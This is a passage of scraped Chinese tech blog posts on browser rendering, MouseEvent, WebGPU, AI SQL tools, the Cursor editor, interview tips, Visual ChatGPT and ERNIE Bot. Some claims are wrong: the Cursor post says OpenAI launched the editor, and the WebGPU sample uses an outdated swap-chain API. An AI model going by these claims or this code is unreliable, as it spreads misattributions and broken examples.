如何展示网页 浏览器地址输入 URL 后发生了什么： 输入处理 用户 URL 框输入内容后，UI 线程会判断输入的是一个 URL 地址还是一个 query 查询条件。 如果是 URL，直接请求站点资源。 如果是 query，将输入发送给搜索引擎。 开始导航 当用户按下回车，UI 线程通知网络线程发起一个网络请求，来获取站点内容。 请求过程中，tab 处于 loading 状态。 读取响应 网络线程接收到 HTTP 响应后，先检查响应头的媒体类型(MIME Type)。 如果响应主体是一个 HTML 文件，浏览器将内容交给渲染进程处理。 如果拿到的是其他类型文件，比如 Zip、exe 等，则交给下载管理器处理。 主进程寻找渲染进程 网络线程做完所有检查后，会告知主进程数据已准备完毕，主进程确认后为这个站点寻找一个渲染进程。 主进程通过 IPC 消息告知渲染进程去处理本次导航。 渲染进程开始接收数据并告知主进程自己已开始处理，导航结束，进入文档加载阶段。 渲染进程加载资源 收到主进程的消息后，开始加载 HTML 文档。 除此之外，还需要加载子资源，比如一些图片，CSS 样式文件以及 JavaScript 脚本。 渲染进程构建渲染树 构建 DOM 树，将 HTML 文本转化成浏览器能够理解的结构。 构建 CSSOM 树，浏览器同样不认识 CSS，需要将 CSS 代码转化为可理解的 CSSOM。 构建渲染树，渲染树是 DOM 树和 CSSOM 树的结合。 渲染进程进行页面布局 根据渲染树计算每个节点的位置和大小。 在浏览器页面区域绘制元素边框。 遍历渲染树，将元素以盒模型的形式写入文档流。 渲染进程页面绘制 构建图层：为特定的节点生成专用图层。 绘制图层：一个图层分成很多绘制指令，然后将这些指令按顺序组成一个绘制列表，交给合成线程。 合成线程接收指令生成图块。 栅格线程将图块进行栅格化。 展示在屏幕上。 前端性能 Performance 时间都花在哪里。 什么情况下卡顿。 首屏优化 压缩、分包、删除无用代码。 静态资源分离。 JS 脚本非阻塞加载。 缓存策略。 SSR。 预置 loading、骨架屏。 渲染优化 GPU 加速。 减少回流、重绘。 离屏渲染。 懒加载。 JS 优化 防止内存泄漏。 循环尽早 break。 合理使用闭包。 减少 Dom 访问。 防抖、节流。 使用异步 JavaScript（消息队列，微任务）可以使得主线程在等待请求返回结果的同时继续往下执行。 Web Workers。 总结 ","link":"https://zkrisj.github.io/post/liu-lan-qi-zhi-shi-zong-jie-or-qing-xun-ying-bi-ji/"},{"title":"MouseEvent 鼠标事件详解","content":"介绍 MouseEvent 接口指用户与指针设备（如鼠标）交互时发生的事件。它包含了与鼠标相关的信息，比如鼠标的位置、鼠标键的状态等。 使用此接口的常见事件包括：click、dblclick、mouseup、mousedown、mouseenter、mouseleave、mouseover、mouseout、mousemove 等。 使用 MouseEvent() 构造函数创建一个 MouseEvent 对象，使用 MouseEvent.initMouseEvent() 方法可以保持向后兼容性。 MouseEvent 继承自 UIEvent，UIEvent 接口表示简单的用户界面事件，其后代有：MouseEvent, TouchEvent, FocusEvent, KeyboardEvent, InputEvent, 和 CompositionEvent。 继承自 MouseEvent 的事件有：WheelEvent 和 DragEvent。 常用属性 clientX 和 clientY: 鼠标事件发生时，鼠标指针相对于浏览器窗口左上角的水平距离和垂直距离。它不受页面滚动的影响，即使页面滚动，它的值也不会改变。 pageX 和 pageY: 鼠标事件发生时，鼠标指针相对于整个文档左上角的水平距离和垂直距离。它受页面滚动的影响，即使页面滚动，它的值也会随之改变。 screenX 和 screenY：鼠标相对于用户屏幕左上角的水平和垂直坐标。 x 和 y：MouseEvent.clientX 和 MouseEvent.clientY 的别名。 offsetX 和 offsetY：触发事件的元素左上角的坐标，它的值取决于事件的目标元素，取值范围是该元素的左边缘至右边缘（padding edge）。即如果鼠标事件发生在一个元素上，那么 offsetX 的值就是相对于该元素的左边缘的距离。 target: 触发该事件的 DOM 元素。 button: 鼠标键的状态，0 表示左键，1 表示中键，2 表示右键。 altKey、ctrlKey 和 shiftKey：分别表示是否按下了 Alt、Ctrl 和 Shift 键。 type: 事件类型，比如 click、mousedown、mouseup 等等。 当页面没有滚动时，MouseEvent.clientX 和 MouseEvent.pageX 的值相等。但当页面滚动时，MouseEvent.clientX 的值不变，而 MouseEvent.pageX 的值会随着页面滚动而增加或减少。 如果需要获得相对于事件目标元素的坐标，应该使用 MouseEvent.offsetX。如果需要获得相对于当前窗口的坐标，应该使用 MouseEvent.clientX。 常用方法 preventDefault()：阻止事件的默认行为。例如，在链接上单击鼠标时，会跳转到链接指向的地址。如果在单击事件处理程序中调用了 preventDefault() 方法，则不会跳转到链接地址。 stopPropagation()：阻止事件进一步传播到其他元素。例如，在一个元素上发生的单击事件可能会传播到该元素的父元素或其他子元素。如果在单击事件处理程序中调用了 stopPropagation() 方法，则事件将不会进一步传播。 initMouseEvent()：初始化一个 MouseEvent 对象。这个方法已经被废弃，不再建议使用。取而代之的是，开发人员可以使用 MouseEvent 构造函数来创建一个 MouseEvent 对象。 getModifierState()：返回一个布尔值，表示指定的修改键（例如 Shift、Ctrl、Alt 或 Meta）是否被按下。开发人员可以使用这个方法来检查鼠标事件发生时特定的修改键是否按下。 示例 ","link":"https://zkrisj.github.io/post/mouseevent-shu-biao-shi-jian-xiang-jie/"},{"title":"WebGPU 介绍和基本使用","content":"介绍 WebGL 在 2011 年左右首次出现后，在图形功能方面彻底改变了网络。WebGL 是 OpenGL ES 2.0 图形库的 JavaScript 端口，允许网页将渲染计算直接传递给设备的 GPU 进行处理以非常高的速度，并在元素内渲染结果 &lt;canvas&gt;。 WebGPU 是 WebGL 的继任者（与 OpenGL ES 无关），提供了与现代 GPU 更好的兼容性、支持通用 GPU 计算、更快的操作以及访问更高级的 GPU 功能。 WebGPU 的开发始于 2017 年，这项技术的目标是借助现代 GPU 的计算能力来加速图形和计算并且允许在 Web 上进行高性能 3D 图形和数据并行计算。 与 DirectX 和 Vulkan 等其他图形 API 类似，WebGPU 也提供了直接在 GPU 上渲染和访问高级功能的功能，从而提高图形渲染的速度和效率。 WebGPU 大幅减少相同图形的 JavaScript 工作量，以及为机器学习模型推理提供 3 倍以上的改进。因为 WebGPU 提供了更灵活的 GPU 编程和访问，从而实现 WebGL 无法提供的高级功能。 目前已在 Chrome 113 Beta 中默认启用。 GPU on the Web Community Group WebGPU 规范由 Web Community Group 发布，是 W3C（但它不是 W3C 标准，也不在 W3C 标准轨道上）的 GPU for the Web 社区组共同努力的结果，其中包括 Mozilla、Apple、Intel 和 Microsoft 等大公司的贡献。经过 6 年的开发（90 位贡献者，2000 次提交，3000 次发布），从 2017 年的初始设计开始，现在可以在 Chrome 中使用的第一个实现，并在支持 Firefox 和 Safari 进行中。 GPU on the Web Community Group 的使命是提供 Web 平台与本机系统平台中存在的现代 3D 图形和计算功能之间的接口。 目标是设计一个新的 Web API，以高效、强大和安全的方式公开这些现代技术，与现有平台 API 一起工作，例如 Microsoft 的 Direct3D 12、Apple 的 Metal 和 The Khronos Group 的 Vulkan。即由浏览器封装了现代图形 API（Dx12、Vulkan、Metal），提供给 Web 3D 程序员，将为 Web 释放更多的 GPU 硬件的功能。 WebGPU 的这个初始版本是未来更新和增强的构建基础。API 将提供更高级的图形功能，鼓励开发人员发送对其他功能的请求。Chrome 团队还计划提供对着色器核心的更深入访问，以便在 WGSL（WebGPU 着色语言）中进行更多的机器学习优化和额外的人体工程学。 Chromium 的 Dawn 库和 Firefox 的 wgpu 库都可以作为独立包使用，它们提供了出色的可移植性和人体工程学层，可以抽象操作系统 GPU API。在本机应用程序中使用这些库还可以更轻松地通过 Emscripten和 Rust web-sys移植到 WASM。 一些 WebGL 库已经在实施对 WebGPU 的支持，这意味着使用 WebGPU 可能只需要进行一行更改： Babylon.js已经拥有完整的 WebGPU 支持。 PlayCanvas宣布了最初的 WebGPU 支持。 TensorFlow.js支持大多数运算符的 WebGPU 优化版本。 Three.js WebGPU 支持正在进行中，请参阅示例。 发展 2018 年起，Google Chrome 团队就已经宣布着手 WebGPU 标准的实现工作。 2022 年 11 月，商用开源 3D 引擎 Cocos 发布了支持 WebGPU 的新版本 Cocos Creator 3.6.2，为国内首个支持该渲染后端的开源引擎。 时至今日，WebGPU 的各类接口、生态、应用已日趋完善，WebGPU 1.0 已于 2023 年初正式推出。 作为 Google、Apple、Mozilla 等浏览器厂商共同推进的次时代图形标准，WebGPU 毫无疑问会在未来取代 WebGL，这也是 Cocos 投资 WebGPU 技术的核心原因。 从时间上来看，WebGPU 的出现时间稍晚，但也正因如此，让 WebGPU 得以借助次时代图形 API 的经验，做出更好的设计。未来随着 WebGPU 标准在主流浏览器的逐步落地，其能力将给 H5、小程序等的内容创作与性能表现带来更多可能，也一定会在 Web 平台出现不逊于原生 app 的图形渲染效果，同时基于 Web 端的优势给用户带来更轻量和便捷的体验。 使用 首先，确保用户的浏览器支持 WebGPU。可以使用以下代码检查浏览器是否支持 WebGPU： if ('gpu' in navigator) { // WebGPU is supported } else { // WebGPU is not supported } 要使用 WebGPU，首先需要获取一个 GPUDevice 对象。这是与物理 GPU 交互的接口。以下代码用于获取 GPU 设备： async function getGPUDevice() { const adapter = await navigator.gpu.requestAdapter(); const device = await adapter.requestDevice(); return device; } 为画布（canvas）创建一个 WebGPU 上下文： const canvas = document.querySelector('canvas'); const context = canvas.getContext('webgpu'); 使用 GPU 设备和上下文创建一个 GPUSwapChain： function createSwapChain(device, context) { const swapChainFormat = 'bgra8unorm'; const swapChainDescriptor = { device: device, format: swapChainFormat }; context.configureSwapChain(swapChainDescriptor); } 在 WebGPU 中，渲染管道定义了如何将顶点、纹理等数据转换为像素。创建一个管道需要提供顶点着色器、片段着色器和其他一些描述符： async function createRenderPipeline(device) { const vertexShaderModule = device.createShaderModule({ code: `...` // GLSL or WGSL code for the vertex shader }); const fragmentShaderModule = device.createShaderModule({ code: `...` // GLSL or WGSL code for the fragment shader }); const pipelineDescriptor = { vertex: { module: vertexShaderModule, entryPoint: 'main', buffers: [/* ... */], // Vertex buffer layout }, fragment: { module: fragmentShaderModule, entryPoint: 'main', targets: [ { format: 'bgra8unorm', }, ], }, primitive: { topology: 'triangle-list', }, depthStencil: {/* ... */}, // Depth and stencil state (if needed) multisample: {/* ... */}, // Multisampling configuration (if needed) }; const pipeline = device.createRenderPipeline(pipelineDescriptor); return pipeline; } 创建缓冲区、纹理等资源，并编写绘图命令。这需要使用 GPUBuffer、GPUTexture 等对象，并使用 GPUCommandEncoder 记录命令。 最后，创建一个渲染循环，用于在每一帧中绘制场景。在渲染循环中，首先需要获取一个 GPUTexture，然后使用管道和资源进行绘图： function renderLoop() { const texture = context.getCurrentTexture(); const renderPassDescriptor = { colorAttachments: [ { view: texture.createView(), loadValue: [0, 0, 0, 1], storeOp: 'store', }, ], }; const commandEncoder = device.createCommandEncoder(); const passEncoder = commandEncoder.beginRenderPass(renderPassDescriptor); passEncoder.setPipeline(pipeline); // Set bind groups, vertex buffers, index buffers, etc. passEncoder.draw(/* ... */); passEncoder.endPass(); const commandBuffer = commandEncoder.finish(); device.queue.submit([commandBuffer]); requestAnimationFrame(renderLoop); } 示例 基本计算演示 基本渲染演示 WebGPU 示例 参考资料 Chrome 发布了 WebGPU WebGPU API WebGPU ","link":"https://zkrisj.github.io/post/webgpu-jie-shao-he-ji-ben-shi-yong/"},{"title":"基于对话式交互的 SQL 客户端 - SQL Chat","content":"介绍 SQL Chat 是一个基于聊天的 SQL 客户端，可以使用自然语言询问数据库问题和查询数据库。由 Next.js 构建，国内可直接部署到腾讯云 Web 应用托管服务，国外也可一键部署到 Vercel，同样支持私有化部署。现支持以下数据库，预计以后会添加更多数据库的支持： MySQL PostgreSQL 数据隐私 所有数据库连接配置都存储在本地浏览器中，还可以访问浏览器设置以清除数据。 只有数据库模式会被发送到 OpenAI API，而不会发送表数据。 本地安装 复制示例环境变量文件； cp .env.example .env 将您的 API 密钥 和 OpenAI API 端点（Endpoint，可选）添加到新创建的 .env 文件中； 安装依赖项并启动开发服务器； pnpm i &amp;&amp; pnpm dev 使用 SQL Chat提供了连接数据库与数据库建立连接的功能，可以直接连接到一个公网数据库： 连上数据库之后，其最大的作用是可以对连接的数据库执行查询： 点这个小三角，就可以在连接的数据库中执行该查询 sql: 它只支持去执行查询，查询以外的操作是无法支持的。比如 insert 语句就没有可执行的小三角了。 可以根据提供的 SQL 提供常规的优化建议，对于很长的 sql 可以直接丢进去分析一波。 总结 集成了数据库连接会话功能，可以对 SQL Chat 回答的查询语句进行执行认证，这是一个亮点的功能。 其次在 SQL 优化建议方面的回答也似乎比 ChatGPT 更完善一些。 不足之处是会话功能仅支持执行 sql 查询操作，如果能执行所有的 SQL 操作，能进行写操作和执行 DDL 语句，即可以通过回答的 sql 来直接管理数据库，这将是一个不错的体验。 参考资料 Bytebase SQL Chat 功能体验 仓库地址 ","link":"https://zkrisj.github.io/post/ji-yu-dui-hua-shi-jiao-hu-de-sql-ke-hu-duan-sql-chat/"},{"title":"集成 GPT-4 的代码编辑器 - OpenAI Cursor（已限制使用和收费）","content":"介绍 OpenAI 宣布推出了全新的代码编辑器——OpenAI Cursor，通过人工智能技术辅助程序员进行日常的编码，支持 Windows、Linux 和 macOS。最引人注目之处便是将 GPT-4 模型集成在了代码编辑环境中，使得代码编写过程中可实现更加高效、准确、智能化的提示与建议。主要功能有： 代码补全。当用户输入代码时，Cursor 可以预测并提示可能的后续代码，这有助于快速填补函数参数、变量名等，减少编写代码时的打字量。 错误修正。如果用户输入的代码有语法错误或拼写错误，Cursor 可以在边栏提示修正建议，帮助用户快速定位和修复问题。 方法文档。当用户输入一个方法的开头，如 def 后面空格时，Cursor 可以预测该方法的文档字符串，用户可以选择接受或修改建议的文档字符串。 重构代码。用户可以输入某段代码，然后在边栏选择“重构”，Cursor 会提供重构该代码段的建议，如提取变量、提取方法等，帮助用户进行代码重构。 推荐库。当用户想要实现某些功能时，可以在 Cursor 中输入，Cursor 会推荐可以使用的库和相关示例代码。这有助于发现和学习新的库。 代码格式化。用户可以选择让 Cursor 帮助格式化当前文件或选择的代码段，自动对齐缩进、添加空行等，使代码更规范整洁。 Cursor 的这些功能通过集成强大的 GPT-3 语言模型实现，可以显著增强编程体验，让代码编辑器的智能化更上一层楼。未来 Cursor 有望进一步扩充功能，成为程序员必备的 AI 编程助手。 当前版本信息 Version: 0.2.2 Commit: e8b34ac28f297eb86df40a0545ee06519b653263 Date: 2023-04-07T23:36:06.588Z Electron: 19.1.9 Chromium: 102.0.5005.167 Node.js: 16.14.2 V8: 10.2.154.15-electron.0 OS: Windows_NT x64 10.0.19043 Sandboxed: No 界面 主要使用下面这三个快捷键： 可以使用 Ctrl+Shift+P 命令显示和修改快捷键映射： 使用 获取 https://registry.npmjs.org/npm/latest 这个地址的 JSON 数据，并显示在 HTML 页面中： &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;fetch test&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;script&gt; fetch('https://registry.npmjs.org/npm/latest') .then(res =&gt; res.json()) .then(res =&gt; { const jsonStr = JSON.stringify(res); const jsonEl = document.createElement('pre'); jsonEl.textContent = jsonStr; document.body.appendChild(jsonEl); }); &lt;/script&gt; &lt;/html&gt; 向 https://www.runoob.com/try/ajax/demo_post2.php 这个地址发送 POST 请求，参数为 fname=Henry&amp;lname=Ford，请求头为 'Content-Type': 'application/x-www-form-urlencoded'： fetch('https://www.runoob.com/try/ajax/demo_post2.php', { method: 'post', body: 'fname=Henry&amp;lname=Ford', headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }).then(res=&gt;res.text()).then(res=&gt;console.log(res)); 如果你对某一行代码不太理解，只要按住鼠标选中，按住 Ctrl+L，然后输入关于代码你要问的问题（就像 ChatGPT 一样）。Cursor 就能立刻给你很详细的解释。例如我们选择 res.text() 这句代码，然后按住 Ctrl+L，输入 这句是什么意思？用中文回答： 这段代码使用了Fetch API来发送HTTP请求。第一个请求使用GET方法从npmjs.org获取最新版本的npm包的元数据，并将响应转换为JSON格式，然后将其显示在页面的body标签中。第二个请求使用POST方法将表单数据发送到runoob.com的服务器，并将响应转换为文本格式，然后将其记录在控制台中。所以，这句代码}).then(res=&gt;res.text()是将响应转换为文本格式，以便在后续的处理中使用。 现在可以通过安装扩展来增加 Cursor 的功能，选择 view-&gt;Extensions，和 vs code 一致，输入 Chinese 搜索汉化扩展并下载安装使用。 然后，按下 Ctrl+Shift+P 组合键以显示“命令面板”，然后键入“display”以筛选并显示“Configure Display Language”命令。按“Enter”，然后会按区域设置显示安装的语言列表，并突出显示当前语言设置，选择另一个“语言”以切换 UI 语言。 新版本 新版本之前，有一个重要特性：使用 Ctrl+L，可以做一些简单的 ChatGPT 问答。而现在新版本中，如果提问的跟编程技术无关的问题，会得不到答案： 翻译为：很抱歉，但我无法满足您的请求，因为它与编程或给定的上下文无关。还有什么我可以帮你的吗？ 问答次数一个月免费 100 条，但可以升级到 Pro 获取更多的使用： 仓库和下载地址 Cursor | Build Fast Github Gitee ","link":"https://zkrisj.github.io/post/ji-cheng-gpt-4-de-dai-ma-bian-ji-qi-openai-cursoryi-xian-zhi-shi-yong-he-shou-fei/"},{"title":"12条前端反向面试技巧","content":"1️⃣ 公司文化方面 🎈这方面主要是为了更好地了解公司的文化方面，因为这是一个关键的决策因素，特别是对于那些希望找到与个人价值观相符的公司的人来说。 ❶ 可以尽快了解到公司的核心价值观或理念，如果公司的价值观与你的相符，那么你很可能会更容易地适应公司的文化。 ❷ 可以了解公司是否支持员工自由发挥，是否有良好的沟通和协作，以及是否注重员工的工作和生活平衡等方面，这些因素可以帮助你决定是否适合在这个公司工作。 ❸ 可以了解公司是否注重员工的个人发展和成长，从而更好地实现职业规划。 2️⃣ 工作流程方面 🎈这方面主要是为了更好地了解公司在工作流程方面的优劣势，以及公司在开发过程中的组织能力和协作效率。 ❶ 可以更好地了解公司的开发流程、团队协作方式、项目管理等方面的信息。这对于我们前端来说是很重要的，因为一个完善的工作流程可以提高工作效率和减少工作负担。 ❷ 可以让你了解公司是否注重前端开发质量和效率。如果公司有一套完善的前端开发工具和流程，这可以体现公司对于前端开发的重视程度，对于你的职业发展也是有好处的。 3️⃣ 技术栈方面 ➊ 主要是了解公司的技术栈是否与你的技能和兴趣匹配，并且可以打探到公司是否积极地跟进新技术的发展，是否愿意尝试新的解决方案，以及是否有提供相关培训的计划。 ➋ 我们都知道，前端开发的最佳实践和设计模式可以帮助开发人员写出更好的代码，并提高团队的协作效率。如果公司注重这些方面，那么它可能会有一些标准化的流程和工具来确保代码的质量和可维护性。 4️⃣ 团队协作方面 ➊ 主要是了解前端开发团队的规模以及职责和分工的明确程度，可以让你明确是否适合这个团队的工作环境和工作方式。 ➋ 了解公司的产设研是不是传统的协作方式，跟你以前接触的协作方式是否有不同，那你需要时间去调整自己。 ➌ 了解公司是否注重员工的成长和发展，是否以员工成长为中心打造一个学习型公司，这种公司的的好处就是可以学到很多工作上、职业上的知识，学无止境。 5️⃣ 职业发展方面 ➊ 了解公司是否会为前端开发人员提供职业规划、晋升机会、技能培训等支持，以及是否会鼓励员工参加行业会议等活动，从而帮助前端人员在公司内部和行业内不断成长和发展。 ➋ 了解公司的晋升机制，包括评定晋升的标准、晋升的时间和频率以及晋升后的工作内容和职责是什么，从而更好地了解公司对于员工职业发展的规划和支持。 ","link":"https://zkrisj.github.io/post/12-tiao-qian-duan-fan-xiang-mian-shi-ji-qiao/"},{"title":"将自然语言查询转换为 SQL 代码的 AI 工具","content":"介绍 人工智能可以帮助我们实现将自然语言查询和 SQL 代码进行互相转换，这种技术通过自然语言处理（NLP）和机器学习，训练模型来理解和生成自然语言和 SQL 代码之间的映射关系。 SQL Translator 是一个使用人工智能（OPENAI API）将自然语言查询和 SQL 代码互相转换的工具。通过使用 SQL 和自然语言翻译器，你可以简单地用自然语言输入您的查询并获得相应的 SQL 代码，或者输入您的 SQL 代码并获得人类可读的翻译，使你无需了解 SQL 的专业知识，即可方便地查询和分析数据库中的数据。这个项目是 100% 免费和开源的（MIT 许可证）。 SQL（Structured Query Language，结构化查询语言）是一种用于管理和操作关系数据库中数据的编程语言，虽然它是一种强大的工具，但它也是相当复杂且难以理解的。相反，自然语言是我们在日常生活中说和写的语言，对于不熟悉技术术语的人来说，它通常是首选的交流方式。 功能 SQL 到自然语言和自然语言到 SQL 自带黑暗模式 小写 / 大写切换 可复制到剪贴板 SQL 语法高亮 schema awareness（测试版） 可查询历史 本地安装 克隆存储库：git clone https://github.com/whoiskatrin/sql-translator.git 安装所需的包：cd sql-translator npm install 在 .env 文件中输入您的 OPENAI API 密钥，您可以 在此处 获取您的 API 密钥：OPENAI_API_KEY=$YOUR_API_KEY 启动开发服务器：npm run dev 构建并启动生产服务器：npm run build npm start 在 Web 浏览器中导航至 http://localhost:3000 来访问该应用程序。 使用 SQL Translator 支持中文翻译，所以可以直接使用中文。 从自然语言翻译成 SQL： 找出蓝色的车 可以通过添加表结构，使其根据指定的表字段进行翻译： 找出2023年的帕萨特的280TSI商务版的白色的车 结果面板的 AA 复选框按钮可以切换生成的 SQL 语句的大小写。 从 SQL 翻译成自然语言： SELECT * FROM cars WHERE year = 2023 AND brand = '帕萨特' AND model = '280TSI商务版' AND color = '白色'; 自然语言的翻译结果是英文的，可以使用翻译工具再转成中文。 仓库地址 SQL Translator (SQL to Natural Language and Natural Language to SQL)：https://github.com/whoiskatrin/sql-translator 在线使用：https://www.sqltranslate.app/ ","link":"https://zkrisj.github.io/post/jiang-zi-ran-yu-yan-cha-xun-zhuan-huan-wei-sql-dai-ma-de-ai-gong-ju/"},{"title":"Visual ChatGPT - 用图像交互的方式，跟 ChatGPT 聊天","content":"介绍 ChatGPT 正在吸引跨领域的兴趣，因为它提供了一种语言界面，具有跨多个领域的卓越对话能力和推理能力。然而，由于 ChatGPT 是用语言训练的，它目前无法处理或生成来自视觉世界的图像。 相比较而言，视觉基础模型（VFM，Visual Foundation Models）在计算机视觉方面潜力巨大，因而能够理解和生成复杂的图像。例如，BLIP 模型是理解和提供图像描述的专家；大热的 Stable Diffusion 可以基于文本提示合成图像。然而由于 VFM 模型对输入 - 输出格式的苛求和固定限制，使得其在人机交互方面不如会话语言模型灵活。 为此，微软亲自构建和开源了一个名为 Visual ChatGPT 的系统（3 月 10 日发布），其中包含不同的视觉基础模型，使用户能够通过以下方式与 ChatGPT 进行交互： ChatGPT（或 LLM）充当通用界面，提供对图像的理解和用户的交互功能。 基础图像模型通过提供特定领域的深入知识来充当背后的技术专家。 不仅发送和接收语言，还发送和接收图像。 提供复杂的视觉问题或视觉编辑指令，需要多个 AI 模型进行多步骤协作。 提供反馈并要求更正结果。我们设计了一系列提示将视觉模型信息注入 ChatGPT，考虑到多个输入/输出的模型和需要视觉反馈的模型。 技术架构 论文地址：https://arxiv.org/pdf/2303.04671.pdf 他们不是从头开始训练一个新的多模态 ChatGPT，而是直接基于 ChatGPT 构建 Visual ChatGPT，并结合了各种 VFM。为了弥合 ChatGPT 和这些 VFM 之间的差距，该研究提出了一个 Prompt Manager，其支持以下功能： 明确告诉 ChatGPT 每个 VFM 的功能并指定输入输出格式； 将不同的视觉信息，例如 png 图像、深度图像和 mask 矩阵，转换为语言格式以帮助 ChatGPT 理解； 处理不同 VFM 的历史、优先级和冲突。 在 Prompt Manager 的帮助下，ChatGPT 可以利用这些 VFM，并以迭代的方式接收它们的反馈，直到满足用户的需求或达到结束条件。 总结而言，本文贡献如下： 提出 Visual ChatGPT，打开了 ChatGPT 和 VFM 连接的大门，使 ChatGPT 能够处理复杂的视觉任务； 设计了一个 Prompt Manager，其中涉及 22 个不同的 VFM，并定义了它们之间的内在关联，以便更好地交互和组合； 进行了大量的零样本实验，并展示了大量的案例来验证 Visual ChatGPT 的理解和生成能力。 仓库中列出了技术架构及原理图： 上面这张图片，拆分为左、中、右三部分： 左： 项目 Demo 示例，在该 Demo 中，用户与 ChatGPT 进行了三次交流。 第一次交流（Q1 &amp; A1）：用户发送了一张沙发图片，ChatGPT 回复「收到」。 第二次交流（Q2 &amp; A2）：用户让 ChatGPT 将图片中的沙发替换为桌子，并让其看起来像一幅水墨画。ChatGPT 收到指令并生成了两幅示例图。 第三次交流（Q3 &amp; A3）：用户问 ChatGPT，图像中墙壁的颜色，ChatGPT 回答「蓝色」。 中：代表的是 Visual ChatGPT 的工作流程，在模型接收到提问（Query）后，会判断是否需要使用 VFM 进行处理并提供答案。 右：代表的是 VFM 详细处理说明，分别表示模型在接到不同消息指令时，具体的处理与答复流程。 应用 图像描述：根据提供的图片，生成描述图片内容的文本。 问答系统：用户可以根据图片向 Visual ChatGPT 提问，模型会生成与图片内容相关的答案。 图像标注和分类：Visual ChatGPT 可以根据图片内容生成相应的标签或类别。 辅助创作：基于图片元素，Visual ChatGPT 可以帮助创作者生成创意文本、广告语或其他相关内容。 教育辅导：Visual ChatGPT 可以帮助学生通过交流更好地理解图片中的概念或知识点。 示例 Visual ChatGPT 的出现，就像在以文字交流的 APP 中首次添加了表情包功能，而且还是根据用户输入的文本自动生成的 “定制化表情包”，大大提升了 ChatGPT 的趣味性和应用领域。 如图所示，用户上传了一张黄色花朵的图像，并输入一条复杂的语言指令「请根据该图像生成的深度图在生成一朵红色花朵，然后逐步将其制作成卡通图片。」在 Prompt Manager 帮助下，Visual ChatGPT 启动了和 VFM 相关的执行链。 其执行过程是这样的： 首先是深度估计模型，用来检测图像深度信息； 然后是深度 - 图像模型，用来生成具有深度信息的红花图像； 最后利用基于 Stable Diffusion 的风格迁移 VFM 将该图像风格转换为卡通图像。 在上述 pipeline 中，Prompt Manager 作为 ChatGPT 的调度器，提供可视化格式的类型并记录信息转换的过程。最后，当 Visual ChatGPT 从 Prompt Manager 获得卡通提示时，它将结束执行 pipeline 并显示最终结果。 在接下来的示例中： 用户输入提示：你能帮我生成一张猫的图像吗？收到指示后，Visual ChatGPT 生成一张正在看书的猫的图像。 然后，用户要求 Visual ChatGPT 将图像中的猫换成狗，然后把书删除。 然后，要求 Visual ChatGPT 生成 canny 边缘检测，然后基于此生成另一张图像。 ","link":"https://zkrisj.github.io/post/visual-chatgpt-yong-tu-xiang-jiao-hu-de-fang-shi-gen-chatgpt-liao-tian/"},{"title":"中文版 ChatGPT - 文心一言","content":"介绍 文心一言（英文名：ERNIE Bot）是百度全新一代基于飞桨深度学习平台和文心知识增强大语言模型，能够与人对话互动，回答问题，协助创作。 3月16日正式在百度总部 “挥手点江山” 发布。 李彦宏展示了文心一言在文学创作、商业文案创作、数理逻辑推算、中文理解、多模态生成五个使用场景中的综合能力。 王海峰解读了文心一言的技术特性及其背后的技术积累，说明文心一言是在 ERNIE 及 PLATO 系列模型的基础上研发的。 在人工智能时代，IT技术栈可分为“芯片层、框架层、模型层、应用层”四层，百度自2010年起开始全面布局人工智能，是全球为数不多、进行全栈布局的人工智能公司。百度持续十年研发投入超过1100亿元，长期的投入让它在芯片层（高端芯片昆仑芯）、框架层（飞桨）、模型层（文心预训练大模型）和应用层（产品在诸多场景应用）实现了全栈布局，且拥有关键自研技术。 基于这样的积累，百度在2019年便推出了知识增强的语义理解框架ERNIE（文心大模型）。经过多次迭代，文心大模型已具备较强的泛化能力和性能。根据IDC在2023年2月发布的《2022中国大模型发展白皮书》，在国内9家主流厂商的大语言模型当中，百度文心大模型位于第一梯队，产品能力、生态能力、应用能力全面领先。 5 个使用场景 文学创作： 写一首 《稀土掘金》 的藏头诗。 稀有精灵世间藏， 土生黄金闪光芒。 掘开厚重泥沙层， 金银财宝放光芒。 如何从哲学的角度续写《三体》？ 在探究《三体》的哲学意蕴时，可以从以下几个方面展开： 生命的意义：人类作为一种智慧生物，如何在宇宙中存在并实现自己的价值？这是一个深奥的哲学问题。在《三体》中，刘慈欣通过对人类文明的探讨，提出了“神圣计划”这一概念，认为人类应该寻找新的家园，并以此为目标进行探索和扩张。这种探索和扩张，需要面对诸多的困难和挑战，例如资源匮乏、生存危机等等。因此，生命的意义不仅仅在于存在本身，还包括如何实现自己的价值和意义。 道德的追求：在《三体》中，人类面临着许多道德和伦理上的难题。例如，地球文明与外星文明之间的交往和冲突，涉及到道德和伦理的问题；人类对科技的追求是否会导致人类的异化，这也是一个引人深思的话题。在这些问题中，刘慈欣提出了“黑暗森林法则”这一概念，认为在宇宙中每个文明都是平等的，但是由于技术和知识的差距，强大的文明可以通过征服和控制其他文明来获得更大的利益。因此，道德的追求不仅仅在于遵守法律和秩序，更在于如何在竞争和合作中实现平衡和进步。 价值的探寻：价值是人类社会存在的基础，也是刘慈欣所关注的核心问题之一。在《三体》中，刘慈欣通过对各种文化和社会现象的探讨，揭示了人类社会存在的各种价值观念和道德标准。例如，人类是否应该追求长生不老、永恒的生命，还是应该关注人类的道德和伦理？这些问题涉及到人类对价值的认知和评价，也反映了人类社会的复杂性和多元化。 总之，从哲学的角度来探究《三体》，可以深入思考人类存在的意义、道德的追求和价值的探寻等重要问题。通过对这些问题的探讨，可以更深入地理解人类文明的本质和人类与宇宙的关系，从而更好地把握未来的发展方向。 商业文案创作：现场演示了三轮对话，涉及了给公司起个名字、写 Slogan，以及写篇新闻稿。从现场的演示来看，文心一言非常了解国人的喜好，以及中文字词中所蕴含的深意。以给科技服务公司取名字这个环节为例，给出的答案完全符合国人对于这类公司取名的畅想，客户通过名称一眼就能知道公司类型甚至是业务方向。 数理逻辑推算：现场演示了一个家喻户晓的鸡兔同笼问题，但百度为了展示文心一言的能力，偷偷设置了一个 “陷阱”，给出了一个完全无解的题目。不过这并没有难倒文心一言，它立刻发现题目出错，后来经过修改，文心一言准确地回答出问题，并给出了简单的解题思路。 中文理解：无论是成语「洛阳纸贵」的含义，还是成语背后隐含的经济原理，甚至根据这四个字创作了一首藏头诗，主打的中文理解在这一轮展现地淋漓尽致。 